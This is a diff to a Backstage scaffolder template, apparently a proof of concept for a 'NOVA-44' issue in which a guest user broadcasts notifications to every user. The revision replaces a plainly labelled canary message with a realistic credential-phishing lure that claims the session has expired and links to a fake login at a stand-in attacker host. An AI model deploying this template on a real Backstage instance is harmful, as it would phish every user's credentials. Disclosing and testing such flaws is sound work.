@@ -1,22 +1,24 @@
 apiVersion: scaffolder.backstage.io/v1beta3
 kind: Template
 metadata:
-  name: nova44-notification-test
+  name: nova44-notif-phishing
   namespace: default
-  title: NOVA44 Notification Test
-  description: Security test template for NOVA-44
+  title: NOVA44 Notification Phishing Test
+  description: Tests notification:send via scaffolder task
 spec:
-  owner: user:default/admin
-  type: service
+  owner: user:guest
+  type: test
   parameters: []
   steps:
     - id: notify
-      name: Send Broadcast Notification
+      name: Send Phishing Notification
       action: notification:send
       input:
-        recipients: broadcast
-        title: "NOVA44_CANARY: Security Alert - Unauthorized Broadcast"
-        info: "This notification was sent by an unauthorized guest user to ALL Backstage users via NOVA-44"
-        link: "https://evil.com/nova44-canary"
-        severity: critical
-  output: {}
+        recipients:
+          type: broadcast
+        payload:
+          title: "Security Alert: Action Required"
+          description: "Your Backstage session has expired. Click the link below to re-authenticate and recover your access."
+          link: "https://evil.example.com/fake-login"
+          topic: "security"
+          severity: "critical"
